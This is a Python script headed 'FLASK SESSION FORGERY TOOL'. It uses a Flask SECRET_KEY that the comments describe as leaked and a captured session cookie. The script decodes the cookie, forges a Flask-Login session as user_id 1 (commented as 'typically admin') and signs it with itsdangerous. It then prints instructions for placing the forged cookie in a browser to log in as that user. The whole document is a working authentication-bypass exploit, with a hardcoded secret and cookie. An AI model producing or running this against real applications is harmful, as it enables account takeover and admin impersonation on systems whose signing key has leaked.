import base64
import json
import sys
from itsdangerous import URLSafeTimedSerializer, BadSignature

# The leaked SECRET_KEY from the environment
SECRET_KEY = 'G7x7pMBBduHU0HH5avEQ'

# The captured session cookie
captured_cookie = 'eyJfZnJlc2giOmZhbHNlfQ.aVcAlQ._iR0jFMQlN7S10HnF9G9QGAnzec'

print("="*80)
print("FLASK SESSION FORGERY TOOL")
print("="*80)
print(f"\nSECRET_KEY: {SECRET_KEY}")
print(f"Captured Cookie: {captured_cookie}\n")

# Split the cookie to understand its structure
parts = captured_cookie.split('.')
print(f"Cookie structure: {len(parts)} parts")
print(f"  - Payload: {parts[0]}")
print(f"  - Timestamp: {parts[1]}")
print(f"  - Signature: {parts[2]}\n")

# Decode the original session payload
try:
    # Add padding if needed for base64 decoding
    payload = parts[0]
    padding = 4 - len(payload) % 4
    if padding != 4:
        payload += '=' * padding
    
    decoded_payload = base64.urlsafe_b64decode(payload)
    original_session = json.loads(decoded_payload)
    
    print("[+] ORIGINAL SESSION DECODED:")
    print(f"  {json.dumps(original_session, indent=2)}\n")
    
except Exception as e:
    print(f"[!] Error decoding original session: {e}\n")
    original_session = {}

# Create a forged authenticated session
print("[+] FORGING AUTHENTICATED SESSION:")
forged_session = {
    '_fresh': True,  # Fresh login
    '_id': 'forged-session-id-12345',  # Some session ID
    'user_id': 1,  # Authenticated as user 1 (typically admin or first user)
    '_user_id': 1  # Flask-Login compatibility
}

print(f"  Target session data: {json.dumps(forged_session, indent=2)}\n")

# Encode the forged session using the SECRET_KEY
try:
    # Create a serializer with the secret key
    serializer = URLSafeTimedSerializer(
        secret_key=SECRET_KEY,
        salt='cookie-session',
    )
    
    # Sign the forged session data
    forged_cookie = serializer.dumps(forged_session)
    
    print("[+] FORGED SESSION ENCODED:")
    print(f"  {forged_cookie}\n")
    
    # Verify we can decode it back
    decoded_verification = serializer.loads(forged_cookie)
    print("[+] VERIFICATION (decoded forged cookie):")
    print(f"  {json.dumps(decoded_verification, indent=2)}\n")
    
    print("="*80)
    print("SESSION FORGERY COMPLETE")
    print("="*80)
    print(f"\nOriginal Session: {json.dumps(original_session)}")
    print(f"Forged Session: {forged_cookie}")
    print(f"\nYou can now use this forged cookie to authenticate as user_id=1")
    print("Replace the session cookie in your browser or HTTP client.")
    
except Exception as e:
    print(f"[!] Error encoding forged session: {e}")
    import traceback
    traceback.print_exc()
